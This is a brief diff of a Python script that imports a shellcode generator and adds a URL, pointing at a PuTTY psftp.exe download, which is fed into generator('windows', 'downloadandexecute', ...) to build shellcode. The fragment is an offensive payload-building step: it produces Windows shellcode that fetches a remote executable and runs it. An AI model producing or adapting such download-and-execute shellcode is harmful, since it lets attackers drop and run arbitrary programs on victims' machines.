@@ -8,6 +8,7 @@
 
 from generator import *
 
+qweqwe = "http://the.earth.li/~sgtatham/putty/latest/x86/psftp.exe" 
 
 shellcode = generator( "windows", "downloadandexecute", qweqwe)
 
